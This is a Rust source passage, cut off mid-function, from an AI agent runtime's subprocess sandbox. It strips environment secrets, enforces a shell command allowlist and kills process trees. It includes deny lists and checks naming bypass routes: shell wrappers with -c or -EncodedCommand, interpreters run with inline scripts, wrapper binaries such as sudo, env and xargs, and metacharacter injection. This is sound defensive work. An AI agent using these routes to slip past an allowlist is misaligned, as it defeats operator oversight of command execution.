//! Subprocess environment sandboxing.
//!
//! When the runtime spawns child processes (e.g. for the `shell` tool), we
//! must strip the inherited environment to prevent accidental leakage of
//! secrets (API keys, tokens, credentials) into untrusted code.
//!
//! This module provides helpers to:
//! - Clear the child's environment and re-add only a safe allow-list.
//! - Validate executable paths before spawning.

use std::path::Path;

/// Environment variables considered safe to inherit on all platforms.
pub const SAFE_ENV_VARS: &[&str] = &[
    "PATH", "HOME", "TMPDIR", "TMP", "TEMP", "LANG", "LC_ALL", "TERM",
];

/// Additional environment variables considered safe on Windows.
#[cfg(windows)]
pub const SAFE_ENV_VARS_WINDOWS: &[&str] = &[
    "USERPROFILE",
    "SYSTEMROOT",
    "APPDATA",
    "LOCALAPPDATA",
    "COMSPEC",
    "WINDIR",
    "PATHEXT",
];

/// Sandboxes a `tokio::process::Command` by clearing its environment and
/// selectively re-adding only safe variables.
///
/// After calling this function the child process will only see:
/// - The platform-independent safe variables (`SAFE_ENV_VARS`)
/// - On Windows, the Windows-specific safe variables (`SAFE_ENV_VARS_WINDOWS`)
/// - Any additional variables the caller explicitly allows via `allowed_env_vars`
///
/// `allowed_env_vars` accepts either explicit variable names or the special
/// wildcard entry `"*"`, which forwards every variable present in the parent
/// process. Use the wildcard only when the operator has explicitly opted in
/// (e.g. `exec_policy.shell_env_passthrough = ["*"]`) — it will leak any
/// secret the parent holds into the child.
///
/// Variables that are not set in the current process environment are silently
/// skipped (rather than being set to empty strings).
pub fn sandbox_command(cmd: &mut tokio::process::Command, allowed_env_vars: &[String]) {
    cmd.env_clear();

    // Re-add platform-independent safe vars.
    for var in SAFE_ENV_VARS {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    // Re-add Windows-specific safe vars.
    #[cfg(windows)]
    for var in SAFE_ENV_VARS_WINDOWS {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    // Wildcard: forward every var from the parent process.
    if allowed_env_vars.iter().any(|v| v == "*") {
        for (key, val) in std::env::vars() {
            cmd.env(key, val);
        }
        return;
    }

    // Re-add caller-specified allowed vars.
    for var in allowed_env_vars {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }
}

/// Merge two env-passthrough lists (hand-granted + exec-policy-granted),
/// deduplicating entries. If either contains `"*"`, the result is just `["*"]`
/// (wildcard subsumes anything else).
pub fn merge_env_passthrough(a: &[String], b: &[String]) -> Vec<String> {
    if a.iter().any(|v| v == "*") || b.iter().any(|v| v == "*") {
        return vec!["*".to_string()];
    }
    let mut out: Vec<String> = Vec::with_capacity(a.len() + b.len());
    for v in a.iter().chain(b.iter()) {
        if !out.iter().any(|existing| existing == v) {
            out.push(v.clone());
        }
    }
    out
}

/// Validates that an executable path does not contain directory traversal
/// components (`..`).
///
/// This is a defence-in-depth check to prevent an agent from escaping its
/// working directory via crafted paths like `../../bin/dangerous`.
pub fn validate_executable_path(path: &str) -> Result<(), String> {
    let p = Path::new(path);
    for component in p.components() {
        if let std::path::Component::ParentDir = component {
            return Err(format!(
                "executable path '{}' contains '..' component which is not allowed",
                path
            ));
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Shell/exec allowlisting
// ---------------------------------------------------------------------------

use openfang_types::config::{ExecPolicy, ExecSecurityMode};

/// SECURITY: Check for shell metacharacters that enable command injection.
///
/// Blocks ALL shell operators that can chain commands, redirect I/O,
/// perform substitution, or otherwise escape the intended command boundary.
/// This is a defense-in-depth layer — even with allowlist validation,
/// metacharacters must be rejected first to prevent injection.
pub fn contains_shell_metacharacters(command: &str) -> Option<String> {
    // ── Command substitution ──────────────────────────────────────────
    // Backtick substitution: `cmd`
    if command.contains('`') {
        return Some("backtick command substitution".to_string());
    }
    // Dollar-paren substitution: $(cmd)
    if command.contains("$(") {
        return Some("$() command substitution".to_string());
    }
    // Dollar-brace expansion: ${VAR}
    if command.contains("${") {
        return Some("${} variable expansion".to_string());
    }

    // ── Command chaining ──────────────────────────────────────────────
    // Semicolons: cmd1;cmd2
    if command.contains(';') {
        return Some("semicolon command chaining".to_string());
    }
    // Pipes: cmd1|cmd2 (data exfiltration + arbitrary command)
    if command.contains('|') {
        return Some("pipe operator".to_string());
    }

    // ── I/O redirection ───────────────────────────────────────────────
    // Output/input/append redirect: >, <, >>
    // Also catches here-strings <<<, process substitution <() >()
    if command.contains('>') || command.contains('<') {
        return Some("I/O redirection".to_string());
    }

    // ── Expansion and globbing ────────────────────────────────────────
    // Brace expansion: {cmd1,cmd2} or {1..10}
    if command.contains('{') || command.contains('}') {
        return Some("brace expansion".to_string());
    }

    // ── Embedded newlines ─────────────────────────────────────────────
    if command.contains('\n') || command.contains('\r') {
        return Some("embedded newline".to_string());
    }
    // Null bytes (can truncate strings in C-based shells)
    if command.contains('\0') {
        return Some("null byte".to_string());
    }

    // ── Background execution and logical chaining ──────────────────────
    // Both & (background) and && (logical AND) are dangerous
    if command.contains('&') {
        return Some("ampersand operator".to_string());
    }
    None
}

/// Extract the base command name from a command string.
/// Handles paths (e.g., "/usr/bin/python3" → "python3").
fn extract_base_command(cmd: &str) -> &str {
    let trimmed = cmd.trim();
    // Take first word (space-delimited)
    let first_word = trimmed.split_whitespace().next().unwrap_or("");
    // Strip path prefix
    first_word
        .rsplit('/')
        .next()
        .unwrap_or(first_word)
        .rsplit('\\')
        .next()
        .unwrap_or(first_word)
}

/// Known shell wrappers that can execute inline scripts via flags.
const SHELL_WRAPPERS: &[&str] = &["powershell", "pwsh", "cmd", "bash", "sh", "zsh"];

/// Known flags that pass inline scripts to shell wrappers.
/// Each entry is (wrapper_names, flag).
const SHELL_INLINE_FLAGS: &[(&[&str], &str)] = &[
    (&["powershell", "pwsh"], "-Command"),
    (&["powershell", "pwsh"], "-command"),
    (&["powershell", "pwsh"], "-c"),
    (&["cmd"], "/c"),
    (&["cmd"], "/C"),
    (&["bash", "sh", "zsh"], "-c"),
    (&["bash", "sh", "zsh"], "--command"),
];

/// PowerShell-style encoded-command flags. The next arg is the base64 of a
/// UTF-16LE-encoded script (per Microsoft's `-EncodedCommand` spec). We decode
/// and feed the inner script back through allowlist validation so wrapped
/// commands cannot bypass the gate.
const SHELL_ENCODED_FLAGS: &[(&[&str], &str)] = &[
    (&["powershell", "pwsh"], "-EncodedCommand"),
    (&["powershell", "pwsh"], "-encodedcommand"),
    (&["powershell", "pwsh"], "-ec"),
    (&["powershell", "pwsh"], "-e"),
];

/// Flags that load scripts or config from disk (or otherwise sidestep inline
/// allowlist validation entirely). Hard-denied on any shell wrapper regardless
/// of allowlist contents: the validator cannot see what the file will execute.
///
/// Also hard-denies `bash -i` interactive mode — no legitimate use via
/// `shell_exec`, opens stdin attack surface. The `bash -O extdebug` two-token
/// form is handled separately in `check_load_from_disk`.
const SHELL_LOAD_FROM_DISK_FLAGS: &[(&[&str], &str)] = &[
    // PowerShell — load script / console config from disk.
    (&["powershell", "pwsh"], "-File"),
    (&["powershell", "pwsh"], "-file"),
    (&["powershell", "pwsh"], "-PSConsoleFile"),
    (&["powershell", "pwsh"], "-psconsolefile"),
    // POSIX shells — load rcfile / init-file / force interactive.
    (&["bash", "sh", "zsh"], "--rcfile"),
    (&["bash", "sh", "zsh"], "--init-file"),
    (&["bash", "sh", "zsh"], "-i"),
];

/// Maximum recursion depth for shell-wrapper unwrapping. One outer wrapper
/// plus one nested wrapper is permitted; anything deeper is pathological and
/// rejected (also prevents algorithmic DoS via deeply-nested base64 payloads).
const MAX_SHELL_RECURSION_DEPTH: u32 = 2;

/// Process-wrapper binaries whose first non-flag positional is the inner
/// command we should recurse into for allowlist validation. Without this,
/// `env FOO=bar /bin/evil` validates only `env` and silently executes the
/// inner unlisted binary. (S9-08.)
const WRAPPER_BINARIES_RECURSE: &[&str] = &["env", "sudo", "nice", "nohup", "timeout"];

/// Process-wrapper binaries hard-denied in Allowlist mode regardless of
/// allowlist contents. These are sysadmin / tracing / namespace tools whose
/// parser surface is too large to trust (`xargs`, `find -exec`, `strace`,
/// `gdb`, `chroot`, `unshare`, `setsid`, `stdbuf`, `flock`, `time`). They
/// have no legitimate use through LLM-driven `shell_exec` — refuse outright
/// even if an operator explicitly allowlists them. (S9-08.)
const WRAPPER_BINARIES_DENY: &[&str] = &[
    "xargs", "find", "strace", "gdb", "chroot", "unshare", "setsid", "stdbuf", "flock", "time",
];

/// Interpreter binaries that, when invoked with an inline-script flag
/// (`-c` / `-e` / `--eval` / `-p`), run arbitrary user-supplied code in a
/// language we cannot parse for allowlist validation. Hard-denied in
/// Allowlist mode. Operators wanting to run scripts can pass a script file
/// path (a regular path argument, not a command) or switch to Full mode.
///
/// Each entry: `(interpreter names, inline-script flags)`. (S9-08.)
const INLINE_SCRIPT_INTERPRETERS: &[(&[&str], &[&str])] = &[
    (&["python", "python2", "python3"], &["-c"]),
    (&["node", "nodejs"], &["-e", "--eval", "-p", "--print"]),
    (&["perl"], &["-e", "-E"]),
    (&["ruby"], &["-e"]),
];

/// Decode a PowerShell `-EncodedCommand` payload: base64(UTF-16LE(script)).
///
/// Returns the decoded script as a `String`. Invalid base64 or odd-byte-length
/// payloads (which cannot be UTF-16) are reported as errors so the validator
/// can reject the whole command.
fn decode_pwsh_encoded_command(payload: &str) -> Result<String, String> {
    use base64::Engine;
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(payload.trim())
        .map_err(|e| format!("pwsh -EncodedCommand: invalid base64 ({e})"))?;
    if bytes.len() % 2 != 0 {
        return Err(
            "pwsh -EncodedCommand: payload length not UTF-16LE aligned (odd byte count)"
                .to_string(),
        );
    }
    let u16s: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    Ok(String::from_utf16_lossy(&u16s))
}

/// If `segment` invokes a shell wrapper with any load-from-disk / interactive
/// flag from `SHELL_LOAD_FROM_DISK_FLAGS` (or `bash -O extdebug`), return Err.
/// Otherwise return Ok(()). Non-wrapper commands pass through unchanged.
fn check_load_from_disk(segment: &str) -> Result<(), String> {
    let trimmed = segment.trim();
    let base = extract_base_command(trimmed);
    let base_lower = base.to_lowercase();
    let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);
    if !SHELL_WRAPPERS.contains(&base_normalized) {
        return Ok(());
    }
    let args: Vec<&str> = trimmed.split_whitespace().skip(1).collect();

    // Two-token form: bash -O extdebug (shopt that enables source-file tracing
    // which can be abused for exfil / arbitrary script load).
    if ["bash", "sh", "zsh"].contains(&base_normalized) {
        for window in args.windows(2) {
            if window[0] == "-O" && window[1].eq_ignore_ascii_case("extdebug") {
                return Err(format!(
                    "Shell wrapper '{base}' invoked with '-O extdebug'                      (debug/load-from-disk flag) — denied."
                ));
            }
        }
    }

    for arg in &args {
        for (wrappers, flag) in SHELL_LOAD_FROM_DISK_FLAGS {
            if !wrappers.contains(&base_normalized) {
                continue;
            }
            if arg.eq_ignore_ascii_case(flag) {
                return Err(format!(
                    "Shell wrapper '{base}' invoked with '{flag}'                      (load-from-disk / interactive flag) — denied."
                ));
            }
        }
    }
    Ok(())
}

/// Hard-deny check: if the segment's base command is in WRAPPER_BINARIES_DENY,
/// reject regardless of allowlist contents. (S9-08.)
fn check_wrapper_binary_deny(segment: &str) -> Result<(), String> {
    let base = extract_base_command(segment.trim());
    let base_lower = base.to_lowercase();
    let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);
    if WRAPPER_BINARIES_DENY.contains(&base_normalized) {
        return Err(format!(
            "Wrapper binary '{base}' is hard-denied in Allowlist mode \
             (process-tracing / namespace / sentinel-execution tools cannot be validated)."
        ));
    }
    Ok(())
}

/// Hard-deny check: if the segment's base is an interpreter from
/// INLINE_SCRIPT_INTERPRETERS and any arg matches its inline-script flag
/// list, reject. (S9-08.)
fn check_inline_script_interpreter(segment: &str) -> Result<(), String> {
    let trimmed = segment.trim();
    let base = extract_base_command(trimmed);
    let base_lower = base.to_lowercase();
    let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);
    for (interps, flags) in INLINE_SCRIPT_INTERPRETERS {
        if !interps.contains(&base_normalized) {
            continue;
        }
        for arg in trimmed.split_whitespace().skip(1) {
            for flag in *flags {
                if arg.eq_ignore_ascii_case(flag) {
                    return Err(format!(
                        "Interpreter '{base}' invoked with inline-script flag '{flag}' \
                         — denied in Allowlist mode (inline scripts are not parseable for \
                         validation; pass a script file path instead)."
                    ));
                }
            }
        }
    }
    Ok(())
}

/// Skip the wrapper's own flags and return the slice of args starting at the
/// inner command, or Err if the inner command is missing / the flag pattern
/// is unrecognized. Fail-closed: when we can't confidently identify the
/// inner command, reject the whole invocation. (S9-08.)
fn unwrap_wrapper_args<'a>(wrapper: &str, args: &'a [&'a str]) -> Result<&'a [&'a str], String> {
    let mut i = 0;
    match wrapper {
        "env" => {
            while i < args.len() {
                let a = args[i];
                if a == "--" {
                    i += 1;
                    break;
                }
                if a == "-u" || a == "--unset" {
                    if i + 1 >= args.len() {
                        return Err("env: dangling -u/--unset flag".to_string());
                    }
                    i += 2;
                    continue;
                }
                if a.starts_with("--unset=") {
                    i += 1;
                    continue;
                }
                if a.starts_with('-') {
                    i += 1;
                    continue;
                }
                if a.contains('=') {
                    // KEY=VALUE env var assignment
                    i += 1;
                    continue;
                }
                break;
            }
        }
        "sudo" => {
            const SUDO_CONSUMING: &[&str] = &[
                "-u", "-g", "-U", "-D", "-h", "-p", "-r", "-t", "-T", "-C", "--user", "--group",
                "--other-user", "--chdir", "--host", "--prompt", "--role", "--type",
                "--command-timeout", "--close-from",
            ];
            while i < args.len() {
                let a = args[i];
                if a == "--" {
                    i += 1;
                    break;
                }
                if SUDO_CONSUMING.contains(&a) {
                    if i + 1 >= args.len() {
                        return Err(format!("sudo: dangling flag '{a}'"));
                    }
                    i += 2;
                    continue;
                }
                if a.starts_with('-') {
                    i += 1;
                    continue;
                }
                break;
            }
        }
        "nice" => {
            while i < args.len() {
                let a = args[i];
                if a == "-n" {
                    if i + 1 >= args.len() {
                        return Err("nice: dangling -n flag".to_string());
                    }
                    i += 2;
                    continue;
                }
                if a.starts_with("--adjustment=") {
                    i += 1;
                    continue;
                }
                if a.starts_with('-') {
                    i += 1;
                    continue;
                }
                break;
            }
        }
        "nohup" => {
            // No flag-consuming behavior; first positional is the inner command.
        }
        "timeout" => {
            const TIMEOUT_CONSUMING: &[&str] = &["-s", "--signal", "-k", "--kill-after"];
            while i < args.len() {
                let a = args[i];
                if TIMEOUT_CONSUMING.contains(&a) {
                    if i + 1 >= args.len() {
                        return Err(format!("timeout: dangling flag '{a}'"));
                    }
                    i += 2;
                    continue;
                }
                if a.starts_with("--signal=") || a.starts_with("--kill-after=") {
                    i += 1;
                    continue;
                }
                if a.starts_with('-') {
                    i += 1;
                    continue;
                }
                break;
            }
            // First positional is DURATION; skip it. Inner = next positional.
            if i >= args.len() {
                return Err("timeout: missing duration".to_string());
            }
            i += 1;
        }
        _ => return Err(format!("unknown wrapper binary '{wrapper}'")),
    }
    if i >= args.len() {
        return Err(format!(
            "wrapper binary '{wrapper}' invoked with no inner command — denied."
        ));
    }
    Ok(&args[i..])
}

/// For a segment whose base is a recursable wrapper binary (env / sudo /
/// nice / nohup / timeout), unwrap it and return all inner command bases
/// that must be validated against the allowlist. Recurses into nested
/// wrappers (both wrapper-binary and shell-wrapper varieties), capped at
/// `MAX_SHELL_RECURSION_DEPTH`. (S9-08.)
fn extract_wrapper_binary_chain(segment: &str, depth: u32) -> Result<Vec<String>, String> {
    if depth > MAX_SHELL_RECURSION_DEPTH {
        return Err(format!(
            "Wrapper-binary recursion exceeds depth cap of {MAX_SHELL_RECURSION_DEPTH} — denied."
        ));
    }
    let trimmed = segment.trim();
    let base = extract_base_command(trimmed);
    let base_lower = base.to_lowercase();
    let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);

    if !WRAPPER_BINARIES_RECURSE.contains(&base_normalized) {
        return Ok(Vec::new());
    }

    let args: Vec<&str> = trimmed.split_whitespace().skip(1).collect();
    let inner = unwrap_wrapper_args(base_normalized, &args)?;
    let inner_segment = inner.join(" ");

    // Hard-deny / load-from-disk checks on the unwrapped inner segment.
    check_wrapper_binary_deny(&inner_segment)?;
    check_inline_script_interpreter(&inner_segment)?;
    check_load_from_disk(&inner_segment)?;

    let mut chain: Vec<String> = Vec::new();
    let inner_base = extract_base_command(&inner_segment).to_string();
    if !inner_base.is_empty() {
        chain.push(inner_base.clone());
    }

    let inner_base_lower = inner_base.to_lowercase();
    let inner_base_normalized = inner_base_lower
        .strip_suffix(".exe")
        .unwrap_or(&inner_base_lower);

    if SHELL_WRAPPERS.contains(&inner_base_normalized) {
        // Inner is a shell wrapper (e.g. `sudo bash -c "..."`).
        let shell_inner = extract_shell_wrapper_inner(&inner_segment, depth + 1)?;
        chain.extend(shell_inner);
    } else if WRAPPER_BINARIES_RECURSE.contains(&inner_base_normalized) {
        // Inner is another wrapper binary (e.g. `sudo env FOO=bar /bin/ls`).
        let nested = extract_wrapper_binary_chain(&inner_segment, depth + 1)?;
        chain.extend(nested);
    }
    Ok(chain)
}


/// If the base command is a known shell wrapper, extract any inline script
/// passed via -Command / -c / /c (or via PowerShell -EncodedCommand) and
/// return the commands within it.
///
/// Returns the list of base command names found inside the inline script,
/// or an empty vec if the command is not a shell wrapper or has no
/// inline/encoded flag. Returns Err if a load-from-disk flag is set, an
/// encoded payload fails to decode, or recursion exceeds the depth cap.
fn extract_shell_wrapper_commands(command: &str) -> Result<Vec<String>, String> {
    extract_shell_wrapper_inner(command, 1)
}

/// Inner workhorse for shell-wrapper inline extraction with depth tracking.
/// `depth` is the nesting level of the wrapper being inspected (outermost = 1).
fn extract_shell_wrapper_inner(segment: &str, depth: u32) -> Result<Vec<String>, String> {
    let trimmed = segment.trim();
    let base = extract_base_command(trimmed);

    let base_lower = base.to_lowercase();
    let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);
    if !SHELL_WRAPPERS.contains(&base_normalized) {
        return Ok(Vec::new());
    }

    let args: Vec<&str> = trimmed.split_whitespace().skip(1).collect();

    // Encoded form first: pwsh -EncodedCommand <base64(UTF-16LE(script))>.
    // We decode and recurse with depth+1 so a nested encoded payload is also
    // validated (until MAX_SHELL_RECURSION_DEPTH).
    for (i, arg) in args.iter().enumerate() {
        for (wrappers, flag) in SHELL_ENCODED_FLAGS {
            if !wrappers.contains(&base_normalized) {
                continue;
            }
            if !arg.eq_ignore_ascii_case(flag) {
                continue;
            }
            if i + 1 >= args.len() {
                return Err(format!(
                    "Shell wrapper '{base}' invoked with '{flag}' but no payload — denied."
                ));
            }
            let payload = args[i + 1];
            let decoded = decode_pwsh_encoded_command(payload)?;
            return extract_inner_script_commands(&decoded, depth);
        }
    }

    // Plain inline form: literal script after -c / -Command / /c.
    for (i, arg) in args.iter().enumerate() {
        for (wrappers, flag) in SHELL_INLINE_FLAGS {
            if !wrappers.contains(&base_normalized) {
                continue;
            }
            if !arg.eq_ignore_ascii_case(flag) {
                continue;
            }
            if i + 1 >= args.len() {
                continue;
            }
            let script = args[i + 1..].join(" ");
            let script = script.trim();
            let script = if (script.starts_with('"') && script.ends_with('"'))
                || (script.starts_with('\'') && script.ends_with('\''))
            {
                &script[1..script.len() - 1]
            } else {
                script
            };
            return extract_inner_script_commands(script, depth);
        }
    }

    Ok(Vec::new())
}

/// Extract base command names from an inline script string, recursing into
/// any nested shell-wrapper invocations (e.g. `pwsh -ec <blob>` whose payload
/// itself contains `pwsh -c "..."`). Recursion is capped at
/// `MAX_SHELL_RECURSION_DEPTH` to prevent algorithmic DoS via deeply-nested
/// encoded payloads. Also enforces `check_load_from_disk` on every wrapper
/// segment encountered along the way.
///
/// Splits on `;`, `&&`, `||`, `|` and returns the base command of each segment
/// (plus any further commands extracted from inner wrapper payloads).
fn extract_inner_script_commands(script: &str, depth: u32) -> Result<Vec<String>, String> {
    if depth > MAX_SHELL_RECURSION_DEPTH {
        return Err(format!(
            "Shell-wrapper recursion exceeds depth cap of {MAX_SHELL_RECURSION_DEPTH} — denied."
        ));
    }
    let mut commands = Vec::new();
    let mut rest = script;
    while !rest.is_empty() {
        let separators: &[&str] = &["&&", "||", "|", ";"];
        let mut earliest_pos = rest.len();
        let mut earliest_len = 0;
        for sep in separators {
            if let Some(pos) = rest.find(sep) {
                if pos < earliest_pos {
                    earliest_pos = pos;
                    earliest_len = sep.len();
                }
            }
        }
        let segment_raw = &rest[..earliest_pos];
        let segment = segment_raw.trim();
        // SECURITY (S9-08): apply hard-deny gates inside nested shell-wrapper
        // scripts too, so `bash -c "xargs ..."` / `bash -c "python -c ..."`
        // cannot bypass the outer-level checks.
        check_wrapper_binary_deny(segment)?;
        check_inline_script_interpreter(segment)?;
        let base = extract_base_command(segment);
        if !base.is_empty() {
            commands.push(base.to_string());
            // If this segment is itself a shell wrapper, recurse: first deny
            // any load-from-disk flag, then unwrap inline/encoded payload.
            let base_lower = base.to_lowercase();
            let base_normalized = base_lower.strip_suffix(".exe").unwrap_or(&base_lower);
            if SHELL_WRAPPERS.contains(&base_normalized) {
                check_load_from_disk(segment)?;
                let inner = extract_shell_wrapper_inner(segment, depth + 1)?;
                commands.extend(inner);
            }
            // S9-08: also recurse into wrapper-binary inner commands inside
            // shell scripts (e.g. `bash -c "sudo ls"` must validate `ls`).
            if WRAPPER_BINARIES_RECURSE.contains(&base_normalized) {
                let chain = extract_wrapper_binary_chain(segment, depth)?;
                commands.extend(chain);
            }
        }
        if earliest_pos + earliest_len >= rest.len() {
            break;
        }
        rest = &rest[earliest_pos + earliest_len..];
    }
    Ok(commands)
}

/// Split a command string into segments by top-level shell separators
/// (`;`, `&&`, `||`, `|`). Returns trimmed, non-empty segment slices.
/// Used by `validate_command_allowlist` to apply per-segment S9-08 gates.
fn extract_all_segments(command: &str) -> Vec<&str> {
    let mut segs = Vec::new();
    let mut rest = command;
    while !rest.is_empty() {
        let separators: &[&str] = &["&&", "||", "|", ";"];
        let mut earliest_pos = rest.len();
        let mut earliest_len = 0;
        for sep in separators {
            if let Some(pos) = rest.find(sep) {
                if pos < earliest_pos {
                    earliest_pos = pos;
                    earliest_len = sep.len();
                }
            }
        }
        let segment = rest[..earliest_pos].trim();
        if !segment.is_empty() {
            segs.push(segment);
        }
        if earliest_pos + earliest_len >= rest.len() {
            break;
        }
        rest = &rest[earliest_pos + earliest_len..];
    }
    segs
}

#[cfg(test)]
/// Extract all commands from a shell command string.
/// Handles pipes (`|`), semicolons (`;`), `&&`, and `||`.
fn extract_all_commands(command: &str) -> Vec<&str> {
    let mut commands = Vec::new();
    // Split on pipe, semicolon, &&, ||
    // We need to split carefully: first split on ; and &&/||, then on |
    let mut rest = command;
    while !rest.is_empty() {
        // Find the earliest separator
        let separators: &[&str] = &["&&", "||", "|", ";"];
        let mut earliest_pos = rest.len();
        let mut earliest_len = 0;
        for sep in separators {
            if let Some(pos) = rest.find(sep) {
                if pos < earliest_pos {
                    earliest_pos = pos;
                    earliest_len = sep.len();
                }
            }
        }
        let segment = &rest[..earliest_pos];
        let base = extract_base_command(segment);
        if !base.is_empty() {
            commands.push(base);
        }
        if earliest_pos + earliest_len >= rest.len() {
            break;
        }
        rest = &rest[earliest_pos + earliest_len..];
    }
    commands
}

/// Validate a shell command against the exec policy.
///
/// Returns `Ok(())` if the command is allowed, `Err(reason)` if blocked.
pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<(), String> {
    match policy.mode {
        ExecSecurityMode::Deny => {
            Err("Shell execution is disabled (exec_policy.mode = deny)".to_string())
        }
        ExecSecurityMode::Full => {
            tracing::warn!(
                command = crate::str_utils::safe_truncate_str(command, 100),
                "Shell exec in full mode — no restrictions"
            );
            Ok(())
        }
        ExecSecurityMode::Allowlist => {
            // SECURITY (S9-09): Hard-deny load-from-disk / interactive flags
            // on any shell wrapper BEFORE doing any other parsing. These flags
            // sidestep inline allowlist validation entirely.
            check_load_from_disk(command)?;

            // SECURITY: Check for shell metacharacters BEFORE base-command extraction.
            // These can smuggle commands inside arguments of allowed binaries.
            //
            // However, we must skip this check for commands wrapped in a known
            // shell wrapper (e.g. `powershell -Command "..."`) because the
            // inline script naturally contains metacharacters (quotes, semicolons).
            // Those inner commands are validated separately below.
            let inner_commands = extract_shell_wrapper_commands(command)?;
            let is_shell_wrapper = !inner_commands.is_empty();

            if !is_shell_wrapper {
                if let Some(reason) = contains_shell_metacharacters(command) {
                    return Err(format!(
                        "Command blocked: contains {reason}. Shell metacharacters are not allowed in Allowlist mode."
                    ));
                }
            }

            // SECURITY (S9-08): per-segment hard-deny gates and wrapper-binary
            // recursion. Build the full set of base commands that must be in
            // the allowlist, including binaries reached through env / sudo /
            // nice / nohup / timeout.
            let mut all_bases: Vec<String> = Vec::new();
            for seg in extract_all_segments(command) {
                check_wrapper_binary_deny(seg)?;
                check_inline_script_interpreter(seg)?;
                let base = extract_base_command(seg);
                if !base.is_empty() {
                    all_bases.push(base.to_string());
                }
                let chain = extract_wrapper_binary_chain(seg, 1)?;
                all_bases.extend(chain);
            }
            for base in &all_bases {
                // Check safe_bins first
                if policy.safe_bins.iter().any(|sb| sb == base.as_str()) {
                    continue;
                }
                // Check allowed_commands
                if policy.allowed_commands.iter().any(|ac| ac == base.as_str()) {
                    continue;
                }
                return Err(format!(
                    "Command '{}' is not in the exec allowlist. Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
                    base
                ));
            }

            // SECURITY (#794): If the outer command is a shell wrapper
            // (powershell, cmd, bash, etc.), also validate all commands
            // found inside the inline script. This prevents bypassing the
            // allowlist by wrapping disallowed commands inside an allowed
            // shell.
            if is_shell_wrapper {
                for inner_cmd in &inner_commands {
                    if policy.safe_bins.iter().any(|sb| sb == inner_cmd) {
                        continue;
                    }
                    if policy.allowed_commands.iter().any(|ac| ac == inner_cmd) {
                        continue;
                    }
                    return Err(format!(
                        "Command '{}' (inside shell wrapper) is not in the exec allowlist. \
                         Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
                        inner_cmd
                    ));
                }
            }

            Ok(())
        }
    }
}

// ---------------------------------------------------------------------------
// Process tree kill — cross-platform graceful → force kill
// ---------------------------------------------------------------------------

/// Default grace period before force-killing (milliseconds).
pub const DEFAULT_GRACE_MS: u64 = 3000;

/// Maximum grace period to prevent indefinite waits.
pub const MAX_GRACE_MS: u64 = 60_000;

/// Kill a process and all its children (process tree kill).
///
/// 1. Send graceful termination signal (SIGTERM on Unix, taskkill on Windows)
/// 2. Wait `grace_ms` for the process to exit
/// 3. If still running, force kill (SIGKILL on Unix, taskkill /F on Windows)
///
/// Returns `Ok(true)` if the process was killed, `Ok(false)` if it was already
/// dead, or `Err` if the kill operation itself failed.
pub async fn kill_process_tree(pid: u32, grace_ms: u64) -> Result<bool, String> {
    let grace = grace_ms.min(MAX_GRACE_MS);

    #[cfg(unix)]
    {
        kill_tree_unix(pid, grace).await
    }

    #[cfg(windows)]
    {
        kill_tree_windows(pid, grace).await
    }
}

#[cfg(unix)]
async fn kill_tree_unix(pid: u32, grace_ms: u64) -> Result<bool, String> {
    use tokio::process::Command;

    let pid_i32 = pid as i32;

    // Try to kill the process group first (negative PID).
    // This kills the process and all its children.
    let group_kill = Command::new("kill")
        .args(["-TERM", &format!("-{pid_i32}")])
        .output()
        .await;

    if group_kill.is_err() {
        // Fallback: kill just the process.
        let _ = Command::new("kill")
            .args(["-TERM", &pid.to_string()])
            .output()
            .await;
    }

    // Wait for grace period.
    tokio::time::sleep(std::time::Duration::from_millis(grace_ms)).await;

    // Check if still alive.
    let check = Command::new("kill")
        .args(["-0", &pid.to_string()])
        .output()
        .await;

    match check {
        Ok(output) if output.status.success() => {
            // Still alive — force kill.
            tracing::warn!(
                pid,
                "Process still alive after grace period, sending SIGKILL"
            );

            // Try group kill first.
            let _ = Command::new("kill")
                .args(["-9", &format!("-{pid_i32}")])
                .output()
                .await;

            // Also try direct kill.
            let _ = Command::new("kill")
                .args(["-9", &pid.to_string()])
                .output()
                .await;

            Ok(true)
        }
        _ => {
            // Process is already dead (kill -0 failed = no such process).
            Ok(true)
        }
    }
}

#[cfg(windows)]
async fn kill_tree_windows(pid: u32, grace_ms: u64) -> Result<bool, String> {
    use tokio::process::Command;

    // Try graceful kill first (taskkill /T = tree, no /F = graceful).
    let graceful = Command::new("taskkill")
        .args(["/T", "/PID", &pid.to_string()])
        .output()
        .await;

    match graceful {
        Ok(output) if output.status.success() => {
            // Graceful kill succeeded.
            return Ok(true);
        }
        _ => {}
    }

    // Wait grace period.
    tokio::time::sleep(std::time::Duration::from_millis(grace_ms)).await;

    // Check if still alive using tasklist.
    let check = Command::new("tasklist")
        .args(["/FI", &format!("PID eq {pid}"), "/NH"])
        .output()
        .await;

    let still_alive = match &check {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            stdout.contains(&pid.to_string())
        }
        Err(_) => true, // Assume alive if we can't check.
    };

    if still_alive {
        tracing::warn!(pid, "Process still alive after grace period, force killing");
        // Force kill the entire tree.
        let force = Command::new("taskkill")
            .args(["/F", "/T", "/PID", &pid.to_string()])
            .output()
            .await;

        match force {
            Ok(output) if output.status.success() => Ok(true),
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                if stderr.contains("not found") || stderr.contains("no process") {
                    Ok(false) // Already dead.
                } else {
                    Err(format!("Force kill failed: {stderr}"))
                }
            }
            Err(e) => Err(format!("Failed to execute taskkill: {e}")),
        }
    } else {
        Ok(true)
    }
}

/// Kill a tokio child process with tree kill.
///
/// Extracts the PID from the `Child` handle and performs a tree kill.
/// This is the preferred way to clean up subprocesses spawned by OpenFang.
pub async fn kill_child_tree(
    child: &mut tokio::process::Child,
    grace_ms: u64,
